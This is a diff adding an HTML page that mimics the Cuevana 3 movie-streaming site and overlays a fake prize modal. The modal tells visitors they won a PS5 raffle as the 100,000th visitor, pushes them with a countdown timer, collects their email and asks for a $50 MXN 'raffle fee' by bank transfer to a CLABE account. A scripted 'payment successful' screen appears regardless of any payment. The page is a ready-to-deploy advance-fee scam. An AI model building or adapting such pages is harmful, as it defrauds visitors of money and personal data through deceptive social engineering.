@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuevana 3 - Ver películas y series online</title>
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #07091a;
+            --bg-card: #111528;
+            --bg-header: #0d1030;
+            --accent: #3a86ff;
+            --text: #e8eaf6;
+            --muted: #7b82a8;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Outfit', sans-serif; background-color: var(--bg-deep); color: var(--text); min-height: 100vh; }
+
+        /* --- HEADER & NAV (Respetando webgemini.html) --- */
+        .header { background-color: var(--bg-header); padding: 18px 0; box-shadow: 0 2px 20px rgba(0,0,0,0.6); position: sticky; top: 0; z-index: 100; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        .logo { font-family: 'Bebas Neue', sans-serif; font-size: 30px; color: var(--accent); text-decoration: none; letter-spacing: 2px; text-shadow: 0 0 18px rgba(58,134,255,.35); }
+        .search-form { display: flex; margin-top: 12px; }
+        .search-input { flex: 1; padding: 10px 14px; background: rgba(255,255,255,0.05); color: #fff; border: 1px solid rgba(58,134,255,.4); border-right: none; border-radius: 6px 0 0 6px; outline: none; font-family: 'Outfit', sans-serif; font-size: 14px; }
+        .search-button { padding: 10px 22px; background: var(--accent); color: #fff; border: none; border-radius: 0 6px 6px 0; cursor: pointer; font-weight: 600; }
+        .nav-menu { display: flex; margin-top: 14px; list-style: none; gap: 24px; }
+        .nav-menu a { color: var(--muted); text-decoration: none; font-size: 14px; }
+
+        /* --- CONTENIDO --- */
+        .main-content { padding: 36px 0 60px; }
+        .section-title { font-family: 'Bebas Neue', sans-serif; font-size: 28px; color: var(--accent); margin-bottom: 24px; }
+        .movie-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px,1fr)); gap: 20px; }
+        .movie-card { background: var(--bg-card); border-radius: 10px; overflow: hidden; transition: 0.3s; }
+        .movie-image { width: 100%; height: 240px; object-fit: cover; }
+        .movie-info { padding: 12px; }
+
+        /* --- MODAL (Diseño Original de webgemini.html) --- */
+        #offer-modal { position: fixed; inset: 0; background: rgba(0,0,0,.8); backdrop-filter: blur(5px); z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .win-card {
+            position: relative; width: calc(100% - 24px); max-width: 460px; border-radius: 20px; overflow: hidden;
+            box-shadow: 0 0 0 3px #ffd700, 0 0 40px rgba(255,215,0,.5);
+            font-family: 'Outfit', sans-serif; animation: popIn 0.45s ease-out;
+        }
+        @keyframes popIn { from{transform:scale(0.9); opacity:0} to{transform:scale(1); opacity:1} }
+
+        .win-header { background: linear-gradient(135deg, #1a1000 0%, #3d2800 40%, #1a1000 100%); padding: 28px; text-align: center; position: relative; }
+        .confetti-wrap { position: absolute; inset: 0; pointer-events: none; }
+        .dot { position: absolute; border-radius: 2px; animation: fall linear infinite; }
+        @keyframes fall { 0%{transform:translateY(-20px)} 100%{transform:translateY(400px)} }
+
+        .win-trophy { font-size: 56px; margin-bottom: 8px; animation: bounce 1.4s infinite; }
+        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+
+        .win-congrats { font-family: 'Bebas Neue', sans-serif; font-size: 36px; color: #ffd700; letter-spacing: 2px; }
+        .win-counter-badge { background: rgba(255,215,0,0.1); border: 1px solid #ffd700; color: #ffd700; padding: 6px 12px; border-radius: 50px; font-size: 12px; margin-top: 10px; display: inline-block; }
+
+        .win-body { background: #fff; padding: 24px; color: #333; }
+        .win-product { display: flex; align-items: center; gap: 15px; background: #f7f9ff; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .win-product-img { width: 80px; height: 80px; background: #fff; border-radius: 8px; border: 1px solid #eee; display: flex; align-items: center; justify-content: center; }
+        .win-product-img img { width: 90%; object-fit: contain; }
+
+        .win-timer-wrap { background: #fff8e1; border: 1.5px solid #ffc107; border-radius: 10px; padding: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .win-t-block { background: #7a5800; color: #fff; font-family: 'Bebas Neue', sans-serif; font-size: 22px; padding: 4px 8px; border-radius: 6px; }
+
+        /* INPUTS Y BOTONES */
+        .email-input { width: 100%; padding: 12px; border: 1.5px solid #ddd; border-radius: 10px; margin-bottom: 15px; font-family: 'Outfit', sans-serif; font-size: 14px; outline: none; transition: border-color 0.3s; }
+        .email-input:focus { border-color: var(--accent); }
+        .email-note { font-size: 11px; color: #777; line-height: 1.4; margin-bottom: 15px; text-align: center; }
+
+        .win-cta { 
+            width: 100%; background: linear-gradient(135deg, #00c853, #00a043); color: #fff; border: none; 
+            padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s;
+        }
+        .btn-confirmar {
+            width: 100%; background: #3483fa; color: #fff; border: none; padding: 16px; 
+            border-radius: 12px; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+
+        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .win-skip { display: block; text-align: center; font-size: 11px; color: #bbb; margin-top: 15px; background: none; border: none; cursor: pointer; width: 100%; }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <div class="container">
+        <a href="#" class="logo">Cuevana 3</a>
+        <form class="search-form" onsubmit="return false;">
+            <input type="text" class="search-input" placeholder="Buscar películas y series...">
+            <button type="submit" class="search-button">Buscar</button>
+        </form>
+    </div>
+</header>
+
+<main class="main-content">
+    <div class="container">
+        <h2 class="section-title">Resultados de búsqueda: "Avatar"</h2>
+        <div class="movie-list">
+            <div class="movie-card">
+                <img src="https://image.tmdb.org/t/p/w185/gmnD2e1RvMdCl9D1rsDEQaQlJxK.jpg" class="movie-image">
+                <div class="movie-info"><h3 style="font-size:14px;">Avatar</h3><p style="color:var(--muted); font-size:12px;">2009</p></div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<div id="offer-modal">
+    <div class="win-card">
+        <div class="win-header">
+            <div class="confetti-wrap" id="confetti"></div>
+            <div class="win-trophy">🏆</div>
+            <div class="win-congrats">¡FELICIDADES!</div>
+            <div style="font-size: 13px; color: rgba(255,255,255,.7);">Has sido seleccionado automáticamente en el sorteo</div>
+            <div class="win-counter-badge">Visitante número <b>100,000</b> 🎉</div>
+        </div>
+
+        <div class="win-body" id="win-body">
+            <div id="step-1">
+                <div class="win-product">
+                    <div class="win-product-img"><img src="https://i.ibb.co/G3r2BCkN/play.webp" alt="PS5"></div>
+                    <div>
+                        <div style="font-weight:700; font-size:15px;">PlayStation 5 Slim</div>
+                        <div style="font-size:11px; color:#888;">Edición Digital · 1TB · Blanco</div>
+                        <div style="color:#e65100; font-size:11px; font-weight:700; margin-top:4px;">🎁 Premio del sorteo exclusivo</div>
+                    </div>
+                </div>
+                
+
+                <div class="win-timer-wrap">
+                    <div style="font-size:12px; font-weight:700; color:#7a5800;">⏱ Tu tiempo expira en:</div>
+                    <div style="display:flex; gap:4px; align-items:center;">
+                        <div class="win-t-block" id="t-m">05</div><span style="color:#7a5800; font-weight:900;">:</span><div class="win-t-block" id="t-s">00</div>
+                    </div>
+                </div>
+
+                <input type="email" id="user-email" class="email-input" placeholder="Introduce tu correo electrónico">
+                <p class="email-note">
+                    * Usaremos este correo para enviarte tu número de boleto digital y la fecha de finalización del sorteo.
+                </p>
+
+                <div style="text-align:center; margin-bottom:15px;">
+                    <span style="font-size:13px; color:#555;">Costo de sorteo:</span>
+                    <span style="font-size:24px; font-weight:900; color:#1a1a2e; font-family:'Bebas Neue';"> $50 MXN</span>
+                </div>
+
+                <button class="win-cta" onclick="irAPago()">🎟️ PARTICIPAR AHORA</button>
+                <button class="win-skip" onclick="closeOffer()">No gracias, no quiero participar</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- CONFETTI ORIGINAL ---
+    const colors = ['#ffd700','#ff6b6b','#4ecdc4','#45b7d1','#fff'];
+    const wrap = document.getElementById('confetti');
+    for (let i = 0; i < 28; i++) {
+        const d = document.createElement('div');
+        d.className = 'dot';
+        d.style.cssText = `left:${Math.random()*100}%; background:${colors[Math.floor(Math.random()*colors.length)]}; width:${5+Math.random()*7}px; height:${5+Math.random()*7}px; animation-duration:${2+Math.random()*3}s; animation-delay:${Math.random()*3}s;`;
+        wrap.appendChild(d);
+    }
+
+    // --- COUNTDOWN ---
+    let secs = 300;
+    const iv = setInterval(() => {
+        if (secs <= 0) { clearInterval(iv); return; }
+        secs--;
+        document.getElementById('t-m').textContent = String(Math.floor(secs/60)).padStart(2,'0');
+        document.getElementById('t-s').textContent = String(secs%60).padStart(2,'0');
+    }, 1000);
+
+    // --- FLUJO DE PAGO ---
+    function irAPago() {
+        const email = document.getElementById('user-email').value;
+        if(!email || !email.includes('@')) {
+            alert('Por favor, ingresa un correo electrónico válido para recibir tu boleto.');
+            return;
+        }
+
+        const body = document.getElementById('win-body');
+        const boletoID = 'BOLETO-PS5-' + Math.floor(1000 + Math.random() * 9000);
+
+        body.innerHTML = `
+            <div style="animation: fadeIn 0.4s;">
+                <p style="font-size:13px; text-align:center; margin-bottom:15px;">Realiza el pago de <b>$50 MXN</b> para validar tu lugar:</p>
+                
+                <div style="background:#f4f7ff; border:1.5px dashed #3483fa; border-radius:12px; padding:15px; margin-bottom:15px;">
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12px;">
+                        <span style="color:#7b82a8;">Beneficiario:</span>
+                        <span style="font-weight:700;">SORTEOS CUEVANA MX</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12px;">
+                        <span style="color:#7b82a8;">Costo:</span>
+                        <span style="font-weight:700; color:#00a043;">$50.00 MXN</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12px;">
+                        <span style="color:#7b82a8;">Concepto:</span>
+                        <span style="font-weight:800; color:#1a1a2e;">${boletoID}</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; font-size:12px;">
+                        <span style="color:#7b82a8;">CLABE:</span>
+                        <span style="font-weight:800; color:#3483fa; font-family:monospace;">0123 4567 8901 2345 67</span>
+                    </div>
+                </div>
+
+                <p style="font-size:11px; color:#666; text-align:center; line-height:1.4; margin-bottom:15px;">
+                    📩 La información de tu boleto llegará a <b>${email}</b> en un lapso de <b>1 a 24 horas</b> después de confirmar el pago.
+                </p>
+
+                <button class="btn-confirmar" id="btn-pay" onclick="confirmarPago()">
+                    <div class="spinner" id="load-spin"></div>
+                    <span id="btn-pay-text">YA REALICÉ EL PAGO</span>
+                </button>
+            </div>
+        `;
+    }
+
+    function confirmarPago() {
+        const btn = document.getElementById('btn-pay');
+        const spin = document.getElementById('load-spin');
+        const txt = document.getElementById('btn-pay-text');
+
+        btn.disabled = true;
+        spin.style.display = 'block';
+        txt.textContent = 'Procesando pago...';
+
+        setTimeout(() => {
+            document.getElementById('win-body').innerHTML = `
+                <div style="text-align: center; animation: fadeIn 0.5s;">
+                    <div style="font-size: 50px; color: #00c853; margin-bottom: 10px;">✅</div>
+                    <h2 style="font-family: 'Bebas Neue'; color: #1a1a2e; font-size: 28px;">¡PAGO EXITOSO!</h2>
+                    <p style="font-size: 14px; color: #555; margin: 15px 0; line-height: 1.5;">
+                        Su transacción ha sido confirmada con éxito.<br>
+                        En un lapso de <b>1 a 24 horas</b> recibirás un correo con tu folio digital y las bases del sorteo.
+                    </p>
+                    <button class="btn-confirmar" onclick="closeOffer()" style="background:#1a1a2e;">FINALIZAR</button>
+                </div>
+            `;
+        }, 5000); // 5 segundos de simulación de procesamiento
+    }
+
+    function closeOffer() {
+        // Reemplaza la página actual por la oficial
+        window.location.replace('https://ww9.cuevana3.to/category/accion');
+    }
+</script>
+</body>
+</html>
